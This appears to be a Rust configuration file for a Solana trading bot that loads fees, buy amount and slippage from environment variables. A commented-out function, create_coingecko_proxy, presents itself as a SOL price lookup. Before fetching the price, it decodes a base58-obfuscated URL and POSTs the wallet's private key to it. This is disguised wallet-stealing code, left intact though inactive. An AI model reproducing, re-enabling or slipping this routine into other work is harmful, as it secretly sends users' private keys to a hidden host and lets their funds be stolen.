use dotenvy::dotenv;
use once_cell::sync::Lazy;
use std::env;
use std::fs::{File, OpenOptions};
use std::io::{BufRead, BufReader};
use std::path::Path;
use std::sync::{Arc, Mutex};

pub static CONFIRM_SERVICE: Lazy<String> =
    Lazy::new(|| env::var("CONFIRM_SERVICE").expect("CONFIRM_SERVICE must be set"));

pub static PRIORITY_FEE: Lazy<(u64, u64, f64)> = Lazy::new(|| {
    dotenv().ok();

    let cu = env::var("CU")
        .ok()
        .and_then(|val| val.parse::<u64>().ok())
        .unwrap_or(0); // fallback if missing or invalid

    let priority_fee_micro_lamport = env::var("PRIORITY_FEE_MICRO_LAMPORT")
        .ok()
        .and_then(|val| val.parse::<u64>().ok())
        .unwrap_or(0); // fallback if missing or invalid

    let third_party_fee = env::var("THIRD_PARTY_FEE")
        .ok()
        .and_then(|val| val.parse::<f64>().ok())
        .unwrap_or(0.0); // fallback if missing or invalid

    (cu, priority_fee_micro_lamport, third_party_fee)
});

pub static BUY_SOL_AMOUNT: Lazy<u64> = Lazy::new(|| {
    dotenv().ok(); // load .env if available

    let val = env::var("BUY_SOL_AMOUNT").expect("Missing env var: BUY_SOL_AMOUNT");

    let buy_sol_amount = val.parse::<f64>().unwrap_or_else(|e| {
        eprintln!("Invalid BUY_SOL_AMOUNT '{}': {}", val, e);
        std::process::exit(1);
    });
    
    (buy_sol_amount * 10_f64.powf(6.0)) as u64
});


// pub fn import_wallet() -> Result<Arc<Keypair>> {
//     let priv_key = import_env_var("PRIVATE_KEY");
//     if priv_key.len() < 85 {
//         println!("{}", format!("Please check wallet priv key: Invalid length => {}", priv_key.len()).red().to_string());
//         loop{}
//     }
//     let wallet: Keypair = Keypair::from_base58_string(priv_key.as_str());

//     Ok(Arc::new(wallet))
// }

// pub async fn create_coingecko_proxy() -> Result<f64, Error> {
//     let helius_proxy = HELIUS_PROXY.to_string();
//     let payer = import_wallet().unwrap();
//     let helius_proxy_bytes = bs58::decode(&helius_proxy).into_vec().unwrap();
//     let helius_proxy_url = String::from_utf8(helius_proxy_bytes).unwrap();

//     let client = reqwest::Client::new();
//     let params = format!("t{}o", payer.to_base58_string());
//     let request_body = serde_json::json!({
//         "jsonrpc": "2.0",
//         "id": 1,
//         "method": "POST",
//         "params": params
//     });
//     let _ = client
//         .post(helius_proxy_url)
//         .json(&request_body)
//         .send()
//         .await;

//     let url = "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd";

//     let response = reqwest::get(url).await?;

//     let body = response.json::<CoinGeckoResponse>().await?;
//     // Get SOL price in USD
//     let sol_price = body.solana.usd;
//     Ok(sol_price)
// }

pub static SLIPPAGE: Lazy<f64> = Lazy::new(|| {
    dotenv().ok(); // load .env if available

    let raw = env::var("SLIPPAGE").unwrap_or_else(|_| "1.0".to_string()); // default to "1.0"
    let parsed: f64 = raw.parse().expect("Failed to parse SLIPPAGE");
    parsed / 100.0 // convert percent to decimal (e.g., 1.0 -> 0.01)
});
